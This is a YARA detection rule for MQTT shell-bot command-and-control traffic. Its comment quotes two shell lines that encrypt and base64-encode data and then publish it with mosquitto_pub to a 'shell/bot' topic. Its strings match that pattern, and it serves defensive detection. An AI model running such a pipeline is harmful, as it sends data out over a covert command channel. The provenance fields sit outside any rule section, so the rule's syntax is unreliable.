rule rule_001_Malicious_MQTT_Shell_Bot_Communication {
    /*
     * Detects MQTT-based command and control communication pattern
     * where data is encrypted, base64 encoded, and published to bot topics.
     * 
     * Example match:
     *   echo $@ |fenc e $key |base64|tr --delete "\n" > /tmp/send.tmp
     *   mosquitto_pub -h $host -t shell/bot -u admin -P pass -f /tmp/send.tmp
     */
    meta:
        description = "MQTT shell bot communication with encryption and base64 encoding"
        severity = "High"
        confidence = "0.88"
        mitre_technique = "T1071.001"
        author = "Script Sentinel"

    // Provenance (auto-generated, do not edit)
    generated_by = "sentinel-generate"
    generated_at = "2025-12-28"
    source_scripts = "0d58e26cd396f807"
    approved_by = "Script Sentinel Team"
    approved_at = "2025-12-28"
    strings:
        // MQTT publishing tools
        $mqtt1 = "mosquitto_pub" nocase
        $mqtt2 = "mqtt_pub" nocase
        
        // Shell/bot topic patterns
        $topic1 = "shell/bot" nocase
        $topic2 = "-t shell" nocase
        $topic3 = "-t bot" nocase
        
        // Encryption + base64 pipeline pattern
        $encrypt_b64_1 = /\|[^|]*base64[^|]*\|[^|]*tr[^|]*delete/ nocase
        $encrypt_b64_2 = /fenc.*\|.*base64/ nocase
        $encrypt_b64_3 = /encrypt.*\|.*base64/ nocase
        
        // Temporary file for sending
        $tmpfile = "/tmp/send.tmp" nocase

    condition:
        any of ($mqtt*) and any of ($topic*) and (any of ($encrypt_b64*) or $tmpfile)
}